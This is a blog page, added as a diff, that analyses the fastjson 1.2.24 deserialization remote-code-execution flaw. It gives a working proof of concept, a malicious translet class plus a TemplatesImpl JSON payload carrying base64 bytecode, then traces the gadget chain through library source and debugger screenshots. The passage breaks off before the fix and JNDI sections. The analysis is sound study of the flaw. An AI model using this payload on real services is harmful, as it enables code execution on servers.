@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="fastjson 1.2.24 反序列化学习"><meta name="keywords" content="java, ll"><link rel="alternate" href="/default" title="ll"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0">
+<link rel="canonical" href="http://yoursite.com/2019/11/06/fastjson_1_2_24/">
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0">
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>fastjson 1.2.24 反序列化学习 - ll</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">ll</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/tags">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/links/">
+        <li class="mobile-menu-item">Links
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">ll</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/links/">
+            Links
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">fastjson 1.2.24 反序列化学习
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-11-06
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc-分析"><span class="toc-text">poc 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试分析"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-注入"><span class="toc-text">JNDI 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>fastjson 是阿里巴巴开源的、java 编写的 json 解析库。以速度快、性能高著称。 在 2017 年 3 月 15 日，fastjson 官方主动爆出 fastjson 在 1.2.22 到 1.2.24 版本间存在远程代码执行高危安全漏洞。下面针对该漏洞进行复现并分析。</p>
+<p>official : <code>https://github.com/alibaba/fastjson</code></p>
+<p>vul : <code>https://github.com/alibaba/fastjson/wiki/security_update_20170315</code></p>
+<h2 id="poc-分析"><a href="#poc-分析" class="headerlink" title="poc 分析"></a>poc 分析</h2><p>分析使用的 poc 是基于 TemplatesImpl 类进行构造的。poc 如下。</p>
+<p>Test.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vulnTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"curl localhost:12345"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Test t = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Poc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vulnTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span> </span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/vulnTest/Test.class"</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span> + evilCode + <span class="string">"\"],"</span> +</span><br><span class="line">                <span class="string">"'_name':'a.b',"</span> +</span><br><span class="line">                <span class="string">"'_tfactory':&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_outputProperties\":&#123; &#125;&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"><span class="comment">//        Object obj  = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span></span><br><span class="line">        Object obj  = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从 poc 中可以看出，需要利用到的类为 TemplatesImpl。实际上，整个漏洞是从 TemplatesImpl 的 getOutputProperties() 开始触发。看一下 getOutputProperties() 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 newTransformer() 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 getTransletInstance() 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>_name</code> 不能为 null，<code>_class</code> 需要为 null，进入 defineTransletClasses() 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    </span><br><span class="line">    TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 其中先创建了静态内部类 TransletClassLoader。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里会用到 <code>_tfactory</code> 属性，所以该值不能为 null。 创建自定义类加载器后，调用了静态内部类（即自定义类加载器）的 defineClass() 方法。实际调用了父类 ClassLoader 的 defineClass() 方法，会将 byte[] 中的二进制字节码转换成一个 Class 对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们需要控制 <code>_bytecodes</code> 属性的值为我们想要加载的恶意类的字节码。 再往下，检查加载进来的类的父类是不是 AbstractTranslet。是的话，会把恶意类在 <code>_class</code> 数组中的索引 i 赋值给 <code>_transletIndex</code>，该属性默认值为 -1，后面会用到该属性，所以构造的恶意类必须继承自 AbstractTranslet 类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"><span class="comment">// Check if this is the main class</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 执行完 defineTransletClasses() 后，在 getTransletInstance() 中，会通过 _transletIndex 从 _class 数组中取出恶意类的 Class 对象，然后调用 newInstance() 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>
+
+<p>所以，只要我们把需要执行的代码放到构造方法中，就会在调用 newInstance() 方法时执行。下面，总结下利用过程中需要注意的几个属性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. _bytecodes    fastjson 会将其 base64 解码，TemplatesImpl 的私有属性，里面存放了恶意类的字节码</span><br><span class="line">2. _name    在方法调用中，需要TemplatesImpl 的私有属性 _name 不为空</span><br><span class="line">3. _tfactory     既没有 getter，也没有 setter，设置为 &#123;&#125;，fastjson 会调用其无参数构造函数得到对应的对象，在 defineTransletClasses() 中用特权创建静态内部类 TransletClassLoader 时会用到 </span><br><span class="line">4. _outputProperties    调用 TemplatesImpl 的 getOutputProperties() 方法，触发利用链</span><br></pre></td></tr></table></figure>
+
+<p>poc 条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@type	指定需要生成的目标类，指定利用类 TemplatesImpl</span><br><span class="line">Feature.SupportNonPublicField	让 fastjson 也会反序列化私有域</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>根据该 poc 的调试分析，我简单做了一张类间的关系图，便于理清整个过程。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/01.png" alt="01"></p>
+<p>在 parse() 方法中，会先将我们指定的 Feature.SupportNonPublicField 选项开启，默认开启的选项如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>              DEFAULT_PARSER_FEATURE;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> features = <span class="number">0</span>;</span><br><span class="line">    features |= Feature.AutoCloseSource.getMask();</span><br><span class="line">    features |= Feature.InternFieldNames.getMask();</span><br><span class="line">    features |= Feature.UseBigDecimal.getMask();</span><br><span class="line">    features |= Feature.AllowUnQuotedFieldNames.getMask();</span><br><span class="line">    features |= Feature.AllowSingleQuotes.getMask();</span><br><span class="line">    features |= Feature.AllowArbitraryCommas.getMask();</span><br><span class="line">    features |= Feature.SortFeidFastMatch.getMask();</span><br><span class="line">    features |= Feature.IgnoreNotMatch.getMask();</span><br><span class="line">    DEFAULT_PARSER_FEATURE = features;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关于 Feature 机制，是通过在枚举类中维护一个 mask 实现的。每个枚举对象对应二进制中的一位，只要通过与运算就可以判断选项的开启情况，也可以通过或运算开启指定选项。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Feature()&#123;</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; ordinal());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> mask;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getMask</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 DefaultJSONParser 的 parse() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/02.png" alt="02"></p>
+<p>跟进 parseObject() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/03.png" alt="03"></p>
+<p>在 parseObject() 中，会先通过 JSONLexerBase 的 scanSymbol() 方法，从输入的 json 中读出第一个双引号间的内容，即 @type，放到 key 中。然后会使用 AppClassLoader 将利用类 TemplatesImpl 加载成一个 Class 对象。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/04.png" alt="04"></p>
+<p>主要看 parseObject() 的下面两行代码。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/05.png" alt="05"></p>
+<p>先看第一行，在 ParserConfig 的 getDeserializer() 中，调用了 createJavaBeanDeserializer() 方法，其中会调用 JavaBean 的 build() 方法，在 build() 方法中，主要会根据 @type 的指定类 TemplatesImpl 的 setter 方法和 getter 方法，猜测属性名，符合要求则将信息存进 FieldInfo 的实例中，将猜测的属性收集到 <code>ArrayList&lt;FieldInfo&gt;</code> ，再封装到 JavaBeanInfo，最终，将 JavaBeanInfo 放到 JavaBeanDeserializer 的 beanInfo 属性中，并返回一个 JavaBeanDeserializer 的实例。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/06.png" alt="06"></p>
+<p>返回的 JavaBeanDeserializer 实例的 fieldDeserializers 和 sortedFieldDeserilaizers 两个属性是猜测的 TemplatesImpl 的属性，后一个是根据属性名进行排序的数组。接着，调用了 putDeserializer() 方法将该 JavaBeanDeserializer 实例存进 ParserConfig 的 derializers 属性中。之后会将刚生成的 JavaBeanDeserializer 返回并调用 deserialze() 方法，该方法是触发的关键。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/07.png" alt="07"></p>
+<p>其中先从传入的 json 字符串中，取出下一个内容，即 <code>_bytecodes</code>。下面会调用前面在 JavaBeanInfo 的 build() 方法中找到的 TemplatesImpl 的无参构造方法创建一个 TemplatesImpl 实例。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/08.png" alt="08"></p>
+<p>后面就是根据传入的 json 中指定的属性名去给这个 TemplatesImpl 实例初始化属性。先从刚刚取到的 <code>_bytecodes</code> 开始。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/09.png" alt="09"></p>
+<p>通过 parseField() 方法，就可以把我们传入的恶意类的字节码存进 <code>_bytecodes</code> 属性中了。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/10.png" alt="10"></p>
+<p>唯一需要注意的是，在给 <code>_tfactory</code> 属性赋值的时候，因为没有对应的 deserializer，所以会调用前面讲过的 createJavaBeanDeserializer() 为其创建一个的 deserializer。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/11.png" alt="11"></p>
+<p>调用刚创建的 deserializer 的 derserialze() 方法为 <code>_tfactory</code> 属性赋值。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/12.png" alt="12"></p>
+<p>这里和前面调用无参构造方法创建 TemplatesImpl 的位置不同，但是也是调用 <code>_tfactory</code> 属性对应的 TransformerFactoryImpl 类的无参构造方法进行初始化。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/13.png" alt="13"></p>
+<p>在 setValue() 方法中会将该值存入 TemplatesImpl 实例中。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/14.png" alt="14"></p>
+<p>在初始化 <code>_outputProperties</code> 时，setValue() 方法中会先调用 TemplatesImpl 的 getOutputProperties() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/15.png" alt="15"></p>
